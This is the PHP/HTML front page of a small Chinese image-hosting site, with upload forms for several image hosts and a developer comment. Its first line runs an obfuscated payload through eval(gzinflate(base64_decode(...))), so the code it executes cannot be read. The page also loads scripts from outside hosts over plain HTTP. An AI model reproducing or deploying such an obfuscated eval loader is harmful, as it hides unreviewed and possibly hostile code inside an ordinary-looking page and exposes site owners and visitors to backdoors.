<?php eval(gzinflate(base64_decode("\x62\x59\x35\116\141\64\x4e\101\106\105\x58\63\147\x76\x39\150\105\107\x47\125\147\x49\107\x53\116\x36\105\x6b\x5a\x74\x56\x53\147\164\x4e\62\156\132\x52\123\x78\166\x47\x70\x6a\66\x67\172\146\x68\121\161\x4a\x66\x2b\x39\x57\x74\x74\144\126\156\144\170\x7a\162\x33\x76\115\144\145\x68\122\x6c\145\146\x47\124\113\165\x54\126\x32\142\x5a\161\62\x4e\x48\x54\163\x71\x79\151\x47\x79\160\145\127\x37\127\60\x4b\124\x55\x2f\106\x50\x66\x66\x6f\151\x5a\x65\112\x55\x39\x53\x67\x32\110\170\154\x71\153\x32\110\x67\114\x38\x34\x62\124\61\x76\x2b\x48\x73\64\142\x4f\x51\x76\70\126\104\x56\x78\166\x50\x67\x68\x2b\x33\x61\x64\113\61\x59\71\x54\165\x6e\142\107\x78\x4d\x63\116\x76\x55\122\67\116\60\x44\x70\x44\x69\113\112\x4f\x6e\x67\x52\111\125\x34\61\x35\x66\x74\144\x6e\x77\x57\x78\71\x64\x37\x6b\x50\x54\171\155\171\x65\x61\x32\112\x4d\123\143\x6e\x55\107\117\130\145\x77\x45\x4d\154\161\101\107\147\146\121\142\x5a\x79\70\156\115\x2b\57\64\103\66\x4e\115\x7a\142\71\67\157\152\117\x78\x78\x55\150\x64\x30\121\143\103\71\x61\x72\x6b\143\145\104\x2f\x66\x72\x50\53\142\x74\x72\161\x37\172\101\x77\75\x3d")));?>
<!--
小猫咪图床
    BY：云猫  
    QQ：3522934828
    目前对接了三楼，芥子，本地，以及小猫咪图床～
    接口能实时更新，没那么容易凉，即便全部凉了，还有一个本地呢～对吧
    前台模板随便找的，不喜欢不要喷(*'ε`*)然后随便凑起来的，不用数据库
    后台有点小丑，别骂(⋟﹏⋞)
    有木有bug没钱还不知道耶(*'へ'*)
    源码:https://ximami.lanzoui.com/b001ig23g
    这程序以后更新都会在上面那个蓝奏云里面
    学生党一枚，聊天注意点哦～
    2021.6.4
-->
<?php if($config['web']==0){echo "<script>alert('网站正在维护哦～');window.location.href='404.html';</script>";}?>
<!doctype html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8"/>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
    <title><?php echo $config['title'];?></title>
    <meta name="keywords" content="<?php echo $config['keywordsl'];?>">
    <meta name="description" content="<?php echo $config['description'];?>">
    <script src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js" type="text/javascript"></script>
    <script src="//cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js" type="text/javascript"></script>
    <script src="//cdn.bootcss.com/layer/2.3/layer.js" type="text/javascript"></script>
    <link href="http://cdn.lq520.club:1212/img/style2.css" rel="stylesheet" type="text/css">
    <link rel="stylesheet" href="//ximami-5g3cz0aqeba76e20-1257450857.tcloudbaseapp.com/404/bg.css" type="text/css" />
</head>
<body>
<div class="container" style="padding-top:20px;">
    <div class="col-xs-12 col-sm-10 col-lg-8 center-block" style="float: none;">
        <div class="panel panel-default card-view">
            <div class="row heading-bg bg-green text-center">
                <h5 class="txt-light"><?php echo $config['title'];?></h5>
            </div>
            <div class="item">
                <div class="testimonial-wrap text-center pl-20 pr-20">
                    <p style="color:#F15B26;font-size: 16px"><?php echo $config['gg'];?></p><br/>
                    <a class="btn btn-success btn-xs" target="_blank" href="<?php echo $config['xiao11'];?>"><?php echo $config['xiao1'];?></a>
                    <a class="btn btn-info btn-xs" target="_blank" href="<?php echo $config['xiao22'];?>"><?php echo $config['xiao2'];?></a>
                    <a class="btn btn-warning btn-xs" target="_blank" href="<?php echo $config['xiao33'];?>"><?php echo $config['xiao3'];?></a>
                </div>
            </div>
            <hr>            
            <div class="tab-struct custom-tab">
                <ul role="tablist" class="nav nav-tabs" id="myTabs_15">
                    <li role="presentation">
                        <a data-toggle="tab" href="#hlx">三楼图床</a>
                    </li>
                    <li role="presentation">
                        <a data-toggle="tab" href="#jz">芥子图床</a>
                    </li>
                    <li class="active" role="presentation">
                        <a data-toggle="tab" href="#localhost">本地图床</a>
                    </li>
                    <li role="presentation">
                        <a data-toggle="tab" href="#api">其他图床</a>
                    </li>
                </ul>
                <form action="hlx.php" method="post" enctype="multipart/form-data">
                <div class="tab-content">
                <div id="hlx" class="tab-pane fade active in">
                <div class="input-group">
                        <center>
                        <input type="file" class="btn btn-success btn-sm" name="file" id="file" />
                        </center>
                        </div>
                        <br>
                        <blockquote>
                            葫芦侠图床，速度挺好，但是压缩严重
                        </blockquote>                        
                        <center><input type="submit" name="submit" class="btn btn-primary" value="上传图片" /></center>
                    </div>
                    </form>
                    
                <div id="localhost" class="tab-pane fade">
                <form action="upload.php" method="post" enctype="multipart/form-data">
                <div class="tab-content">
                <div class="input-group">
                        <center>
                        <input type="file" class="btn btn-success btn-sm" name="file" id="file" />
                        </center>
                        </div>
                        <br>
                        <blockquote>
                            本地图床，图片无压缩，速度取决于服务器速度
                        </blockquote>
                                                <center><input type="submit" name="submit" class="btn btn-primary" value="上传图片" /></center>
                    </div>
                    </form>                    
                    </div>
                    <div id="jz" class="tab-pane fade">
                <form action="jz.php" method="post" enctype="multipart/form-data">
                <div class="tab-content">
                        <div class="input-group">
                        <center>
                        <input type="file" class="btn btn-success btn-sm" name="file" id="file" />
                        </center>
                        </div>
                        <br>
                        <blockquote>
                            芥子图床，速度还行，压缩没三楼严重
                        </blockquote>
                        <center><input type="submit" name="submit" class="btn btn-primary" value="上传图片" /></center>
                    </div>
                    </form>
                    </div>
                    <div id="api" class="tab-pane fade">
                <form action="api.php" method="post" enctype="multipart/form-data">
                <div class="tab-content">
                        <div class="input-group">
                        <center>
                        <input type="file" class="btn btn-success btn-sm" name="file" id="file" />
                        </center>
                        </div>
                        <br>
                        <blockquote>
                            小猫咪图床，图片无压缩，速度不算慢～
                        </blockquote>
                        <center><input type="submit" name="submit" class="btn btn-primary" value="上传图片" /></center>
                      </div>
                    </form>
                    </div>
               <div class="panel panel-default card-view">
            <center><p><?php echo $config['foot'];?></p></center>           
            <center><p><font color="black"><script type="text/javascript" src="http://api.lq520.club/api/yy2.php?format=js&charset=utf-8"></script><script>misaka()</script></font></p></center>
        </div>
    </div>
</div>
<div id="audio"class="music">
<img src="http://cdn.lq520.club:1212/gif/music.gif" width="60px" height="60px" id="d" onclick="c();">
</div>
<audio id="bgmMusic" src="<?php echo $config['music'];?>" autoplay="autoplay" loop="loop" preload="auto" type="audio/mp3"></audio>
</body>
</html>